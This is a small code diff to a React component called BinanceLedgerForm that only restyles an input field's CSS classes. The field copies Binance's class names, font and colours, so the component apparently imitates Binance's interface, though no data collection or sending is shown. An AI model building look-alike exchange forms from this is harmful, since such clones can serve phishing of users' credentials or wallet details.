@@ -1,4 +1,3 @@
-
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 
@@ -130,7 +129,7 @@ const BinanceLedgerForm: FC = () => {
                     autoFocus
                     id="bn-formItem-q8nY2Y1v"
                     autoCapitalize="off"
-                    className="bn-textField-input !w-[inherit] bg-transparent border-0 text-white p-3 w-full outline-none placeholder-[#848E9C]"
+                    className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                     style={{ 
                       color: "var(--color-PrimaryText, #EAECEF)",
                       fontFamily: "BinanceNova, Arial, sans-serif",
